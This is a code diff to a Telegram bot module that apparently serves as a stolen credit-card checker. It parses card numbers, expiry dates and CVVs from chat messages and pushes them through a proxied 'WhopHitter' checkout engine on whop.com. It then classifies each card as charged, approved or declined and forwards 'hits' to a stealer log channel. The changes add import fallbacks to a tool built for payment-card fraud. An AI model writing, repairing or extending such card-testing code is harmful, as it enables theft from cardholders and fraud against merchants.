@@ -33,15 +33,47 @@ from aiogram import types, F, Router
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# LOCAL IMPORTS
+# LOCAL IMPORTS — fully defensive so a missing module
+# doesn't take the whole bot down with an ImportError.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-from utils_send import safe_send_message
+
+# ── Database (all these exist in database.py) ──
 from database import (
-    is_gate_enabled, get_db_connection, 
-    create_user, update_user_stats
+    is_gate_enabled,
+    get_db_connection,
+    create_user,
+    update_user_stats,
+    get_premium_status,
 )
-from bin import get_bin_info
-from sub import get_premium_status, get_hitter_status
+
+# `sub.get_hitter_status` does not exist in this build.
+# `database.get_premium_status` returns (bool, Optional[datetime])
+# which is exactly what the rest of this file expects.
+get_hitter_status = get_premium_status
+
+# ── BIN lookup — try both known locations, then stub ──
+try:
+    from bin import get_bin_info
+except ImportError:
+    try:
+        from tools.binn import get_bin_info
+    except ImportError:
+        logging.warning("[whop] get_bin_info not found in 'bin' or 'tools.binn' — using empty stub.")
+        async def get_bin_info(bin_number):
+            return {}
+
+# ── Safe send — fall back to a direct bot.send_message wrapper ──
+try:
+    from utils_send import safe_send_message
+except ImportError:
+    logging.warning("[whop] utils_send.safe_send_message not found — using direct send_message wrapper.")
+    async def safe_send_message(bot, chat_id, text, **kwargs):
+        try:
+            await bot.send_message(chat_id=chat_id, text=text, **kwargs)
+        except Exception as e:
+            logging.error(f"[whop] safe_send_message fallback failed: {e}")
+
+# ── Whop checkout engine ──
 from gates.whop_hitter import WhopHitter
 
 # Router for this module
@@ -60,6 +92,9 @@ def to_math_bold(s: str) -> str:
 
 user_last_command_time = {}
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# ADMIN IDS — synced with main.py
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ADMIN_IDS = {6962534443, 8428369446}
 
 DEFAULT_ADMIN_PROXIES = [
@@ -192,7 +227,6 @@ async def whop_command(message: types.Message):
     if message.reply_to_message:
         full_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")
 
-    # Regex for Whop URL
     url_match = re.search(r'(https?://(?:www\.)?whop\.com/[^\s]+)', full_text)
     if not url_match:
         await message.reply(
@@ -208,7 +242,6 @@ async def whop_command(message: types.Message):
 
     whop_url = url_match.group(1).strip()
 
-    # Regex for CC format
     cc_pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
     cc_match = re.search(cc_pattern, full_text)
 
@@ -275,7 +308,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
         except Exception as e:
             logging.error(f"Error ensuring user exists: {e}")
 
-        # Custom Emoji IDs
         CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
         CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
         CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"
@@ -291,7 +323,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             hitter = WhopHitter(proxy=selected_proxy)
             result = await hitter.hit(url=whop_url, email=None, card=formatted_cc)
 
-            # Fallback if proxy failed or errored out
             resp_code = str(result.get("Response", "")).upper()
             if selected_proxy and any(k in resp_code for k in ("PAGE_ERROR", "CHECKOUT_INIT_FAILED", "PATCH_EXCEPTION", "PATCH_FAILED", "CREATE_FAILED", "CREATE_EXCEPTION", "EMBED_EXCEPTION", "TOKEN_EXCEPTION", "FAILED TO CONNECT", "INCOMPLETE")):
                 logging.warning(f"Selected proxy failed for Whop check ({resp_code}), falling back to direct connection...")
@@ -313,7 +344,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             otp_code = "N/A"
             elapsed = round(time.time() - start_time, 2)
 
-        # Classification
         is_charged = False
         msg_lower = res_message.lower()
 
@@ -330,7 +360,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'
             is_charged = False
 
-        # BIN lookup
         try:
             bin_info = await get_bin_info(cc[:6])
         except Exception as e:
@@ -345,13 +374,11 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
         country_flag = bin_info.get("country_emoji", "")
         bin_country = f"{country_flag} {country_name}" if country_flag else country_name
 
-        # Update user stats
         try:
             await asyncio.to_thread(update_user_stats, user_id, is_charged)
         except Exception as e:
             logging.error(f"Failed to update stats: {e}")
 
-        # Build response message
         user_name_safe = html.escape(user.first_name or "User")
         user_link = f'<a href="tg://user?id={user.id}">{user_name_safe}</a>'
         dev_link = '<a href="https://t.me/Salluuxx">Zlatan</a>'
@@ -362,7 +389,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
         email_display = f"<code>{html.escape(buyer_email)}</code>" if buyer_email else "<code>N/A</code>"
         otp_display = f"<code>{html.escape(otp_code)}</code>" if otp_code and otp_code != "N/A" else "<code>Direct Multi-PSP</code>"
 
-        # Format with safe math bold (HTML safe, no entity corruption)
         final_caption = (
             f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {final_status}!</b>\n\n"
             f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗖:</b> <code><b>{formatted_cc}</b></code>\n"
@@ -388,7 +414,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             [InlineKeyboardButton(text="ZLATAN", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
         ])
 
-        # Robust multi-tier edit to guarantee it never freezes
         try:
             await proc_msg.edit_text(
                 text=final_caption,
@@ -418,7 +443,6 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
                     except Exception:
                         pass
 
-        # Broadcast hits to logs / stealer channel
         if is_charged or status_raw in ("APPROVED", "LIVE"):
             hit_badge = "CHARGED 💎" if is_charged else "APPROVED ✅"
             log_caption = (
